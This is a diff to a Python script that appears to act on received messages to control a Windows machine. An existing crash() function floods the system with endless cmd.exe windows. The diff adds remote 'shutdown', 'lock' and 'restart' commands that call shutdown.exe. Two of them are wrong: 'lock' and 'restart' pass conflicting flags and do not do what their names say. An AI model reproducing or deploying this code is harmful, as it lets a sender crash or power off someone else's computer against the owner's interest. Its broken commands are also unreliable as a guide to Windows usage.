@@ -40,6 +40,12 @@ while (keepgoing == True):
                 website()
             elif msg == "crash":
                 crash()
+            elif msg == "shutdown":
+                shutdown()
+            elif msg == "lock":
+                lock()
+            elif msg == "restart":
+                restart()
 
     except:
         traceback.print_exc()
@@ -73,3 +79,15 @@ def crash():
     while True:
         os.system("start /B start cmd.exe")
         print("started")
+
+
+def shutdown():
+    os.system("shutdown /s /t 1")
+
+
+def lock():
+    os.system("shutdown /s /l 1")
+
+
+def restart():
+    os.system("shutdown /s /r 1")
